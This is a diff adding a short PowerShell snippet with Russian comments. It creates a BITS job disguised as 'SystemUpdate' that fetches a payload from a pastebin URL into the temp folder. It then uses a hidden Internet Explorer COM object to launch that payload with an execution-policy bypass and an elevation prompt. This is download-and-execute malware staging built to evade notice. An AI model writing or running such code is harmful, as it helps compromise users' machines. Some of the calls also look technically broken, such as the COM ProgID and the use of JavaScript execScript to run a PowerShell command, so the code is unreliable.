@@ -1,0 +1,12 @@
+# BITS передает файлы с SYSTEM правами
+$bits = New-Object -ComObject "Bits.IBackgroundCopyManager"
+$job = $bits.CreateJob("SystemUpdate", 0, $null, $null)
+$job.AddFile("https://pastebin.com/raw/xxxx", "$env:TEMP\payload.ps1")
+$job.Resume()
+
+# Через Internet Explorer запускаем
+$ie = New-Object -ComObject "InternetExplorer.Application"
+$ie.Visible = $false
+$ie.Navigate("about:blank")
+$doc = $ie.Document
+$doc.parentWindow.execScript("Start-Process powershell -ArgumentList '-ep bypass -f %TEMP%\payload.ps1' -Verb RunAs", "JavaScript")
